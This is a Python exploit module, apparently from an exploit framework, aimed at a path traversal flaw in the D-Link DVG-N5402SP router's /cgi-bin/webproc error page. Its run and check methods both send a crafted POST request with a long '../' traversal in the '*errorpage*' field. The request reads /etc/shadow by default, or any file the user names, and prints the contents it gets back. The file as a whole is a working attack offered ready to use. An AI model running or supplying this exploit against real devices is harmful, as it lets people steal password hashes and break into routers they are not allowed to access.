#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DVG-N5402SP Path Traversal',
        'description': 'D-Link DVG-N5402SP error page allow path traversal',
        'reference': ['https://www.exploit-db.com/exploits/39409/'],
    }

    prompt = 'dvg_webproc_traversal'

    def __init__(self):
        super().__init__()

    def run(self, host, port, timeout):
        filename = input('Please input filename(default: /etc/shadow): ')
        if filename == '':
            filename = '/etc/shadow'

        url = "{}:{}/cgi-bin/webproc".format(host, port)
        data = {
            "getpage": "html/index.html",
            "*errorpage*": "../../../../../../../../../../..{}".format(filename),
            "var%3Amenu": "setup",
            "var%3Apage": "connected",
            "var%": "",
            "objaction": "auth",
            "%3Ausername": "blah",
            "%3Apassword": "blah",
            "%3Aaction": "login",
            "%3Asessionid": "abcdefgh"
        }

        # connection
        response, err = self.http_post(self.s, url, timeout, data)
        if err:
            self.print_requests_err(host, port, err)
            return

        if response.status_code == 200:
            utils.print_success("Exploit success")
            utils.print_info("File: {}".format(filename))
            utils.print_info(response.text)
        else:
            utils.print_failed("Exploit failed")

    def check(self, host, port, timeout):
        # address and parameters
        url = "{}:{}/cgi-bin/webproc".format(host, port)
        data = {
            "getpage": "html/index.html",
            "*errorpage*": "../../../../../../../../../../../etc/shadow",
            "var%3Amenu": "setup",
            "var%3Apage": "connected",
            "var%": "",
            "objaction": "auth",
            "%3Ausername": "blah",
            "%3Apassword": "blah",
            "%3Aaction": "login",
            "%3Asessionid": "abcdefgh"
        }

        # connection
        response, err = self.http_post(self.s, url, timeout, data)
        if err:
            self.print_requests_err(host, port ,err)
            self.print_check_result(False, host)
            return False

        if "root" in response.text:
            self.print_check_result(True, host)
            return True  # target vulnerable

        self.print_check_result(False, host)
        return False  # target not vulnerable

